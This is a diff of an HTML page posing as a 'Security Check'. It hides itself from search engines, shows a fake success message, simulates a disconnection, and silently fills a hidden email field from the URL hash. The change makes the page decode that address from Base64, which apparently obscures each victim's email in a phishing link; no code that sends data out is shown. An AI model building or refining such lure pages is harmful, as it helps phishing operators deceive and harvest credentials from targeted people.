@@ -4,14 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Check</title>
-    <!-- Security Headers -->
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <meta http-equiv="X-Frame-Options" content="DENY">
     <meta http-equiv="X-XSS-Protection" content="1; mode=block">
     <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
     <meta http-equiv="Referrer-Policy" content="no-referrer">
-    
+
     <style>
         .container {
             display: flex;
@@ -59,21 +58,25 @@
         <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
     </div>
 
-    <!-- Add an email field to grab the email -->
+    <!-- Hidden email field to auto-grab Base64-encoded email -->
     <input type="email" id="email" placeholder="Your email" style="display:none;">
 
     <script>
         (function() {
             'use strict';
 
-            // Function to extract the email from URL hash (e.g., #email=test@example.com)
+            // Function to extract Base64-encoded email from the URL hash (e.g., #email=Y29udGFjdEBleGFtcGxlLmNvbQ==)
             function getEmailFromHash() {
-                const hash = window.location.hash;
-                const params = new URLSearchParams(hash.substring(1)); // Skip the #
-                return params.get("email");
+                const hash = window.location.hash.substr(1); // Remove the leading '#'
+                try {
+                    return atob(hash); // Decode Base64 email
+                } catch (error) {
+                    console.error("Failed to decode Base64 email:", error);
+                    return null;
+                }
             }
 
-            // Populate the hidden email field
+            // Populate the hidden email field with the decoded email
             function populateEmail() {
                 const email = getEmailFromHash();
                 if (email) {
@@ -111,7 +114,7 @@
 
             window.onload = function() {
                 simulateDisconnection();
-                setTimeout(populateEmail, 10000);
+                setTimeout(populateEmail, 5000); // Wait 5 seconds before decoding and populating the email
             };
         })();
     </script>
